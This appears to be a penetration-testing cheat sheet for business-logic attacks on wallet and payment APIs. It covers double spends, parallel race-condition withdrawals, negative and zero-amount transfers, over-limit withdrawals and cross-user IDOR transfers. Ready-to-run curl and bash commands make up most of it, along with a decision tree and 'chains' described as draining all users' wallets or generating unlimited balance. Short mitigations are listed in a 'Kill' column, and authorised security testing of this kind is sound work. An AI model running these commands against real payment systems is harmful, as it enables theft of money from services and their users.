# WALLET / BALANCE MANIPULATION — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Double Spend** | balance/withdraw endpoint | `curl -X POST /withdraw -d '{"amount":100}'` ×2 sequentially | Both 200, balance -200 | "Insufficient funds" 2nd |
| **Race Withdraw** | balance endpoint returns fast | `for i in {1..30}; do curl -X POST /withdraw -d '{"amount":100}' &; done; wait` | Balance = initial - (100×N) | unique constraint on tx |
| **Negative Transfer** | amount field accepts negative | `curl -X POST /transfer -d '{"to":"user2","amount":-500}'` | Your balance +500, theirs -500 | amount >= 0 validation |
| **Zero Amount** | amount=0 edge case | `curl -X POST /transfer -d '{"to":"user2","amount":0}'` | Balance changes or tx created | validation rejects 0 |
| **Over-limit** | amount > balance | `curl -X POST /withdraw -d '{"amount":999999}'` | 200 + negative balance | "insufficient balance" |
| **Cross-user** | user_id/account_id in body | `curl -X POST /transfer -d '{"from":"VICTIM_ID","to":"MY_ID","amount":100}'` | Victim balance -100 | Server uses session's user, not body |

## CURL COMMANDS
```bash
# Race withdraw (30 parallel)
BALANCE=$(curl -s /api/wallet -H "Cookie: A" | jq '.balance')
for i in {1..30}; do
  (curl -s -X POST /api/withdraw -H "Cookie: A" \
    -H "Idempotency-Key: race-$i" \
    -d '{"amount":10}' &>/dev/null) &
done; wait
NEW_BALANCE=$(curl -s /api/wallet -H "Cookie: A" | jq '.balance')
echo "Before: $BALANCE, After: $NEW_BALANCE, Diff: $((BALANCE - NEW_BALANCE))"
# If diff > 10*N → race won

# Negative amount
curl -X POST /api/transfer -H "Cookie: A" \
  -d '{"recipient_id":"user2","amount":-500,"currency":"USD"}'

# Check atomicity: does DB use UPDATE ... SET balance = balance - amount?
grep -r "balance = balance" target_src/ 2>/dev/null || echo "Look for non-atomic patterns in source"
```

## DECISION TREE
```
Found wallet/balance endpoint?
├─ Can withdraw > balance?
│  ├─ 200 → OVER-LIMIT (chain: negative balance, can't be collected)
│  └─ 403 → validation present
├─ Does parallel withdraw work >1x?
│  ├─ Yes, multiple 200s → RACE CONDITION (check actual ledger!)
│  └─ No, unique constraint → atomic
├─ Can transfer negative amount?
│  ├─ Yes → NEGATIVE TRANSFER (chain: infinite money generation)
│  └─ No → amount >= 0 check
└─ Can transfer from other user's account?
   ├─ Yes → CROSS-USER IDOR
   └─ No → session-bound
```

## CHAIN
Race Withdraw + IDOR = Drain all users' wallets
Negative Transfer + Loop = Unlimited balance
